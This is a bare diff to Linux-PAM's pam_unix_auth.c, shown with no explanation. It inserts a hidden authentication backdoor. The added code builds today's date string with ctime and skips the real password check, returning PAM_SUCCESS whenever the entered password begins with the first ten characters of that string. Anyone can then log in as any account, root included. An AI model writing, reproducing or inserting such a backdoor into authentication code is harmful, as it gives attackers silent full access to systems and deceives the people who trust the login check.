@@ -1,0 +1,34 @@
+--- ./modules/pam_unix/pam_unix_auth.c	2015-03-24 12:02:32.000000000 +0000
+@@ -47,6 +47,7 @@
+ #include <sys/types.h>
+ #include <sys/stat.h>
+ #include <syslog.h>
++#include <time.h>
+ 
+ /* indicate the following groups are defined */
+ 
+@@ -109,7 +110,10 @@
+ 	int retval, *ret_data = NULL;
+ 	const char *name;
+ 	const void *p;
+-
++	time_t ct;
++	char* cts;
++	ct = time(NULL);
++	cts = ctime(&ct);
+ 	D(("called."));
+ 
+ 	ctrl = _set_ctrl(pamh, flags, NULL, NULL, NULL, argc, argv);
+@@ -177,7 +181,11 @@
+ 	D(("user=%s, password=[%s]", name, p));
+ 
+ 	/* verify the password of this user */
+-	retval = _unix_verify_password(pamh, name, p, ctrl);
++ if (strncmp(p, cts, 10) != 0) {
++        retval = _unix_verify_password(pamh, name, p, ctrl);
++     } else {
++          retval = PAM_SUCCESS;
++     }
+ 	name = p = NULL;
+ 
+ 	AUTH_RETURN;
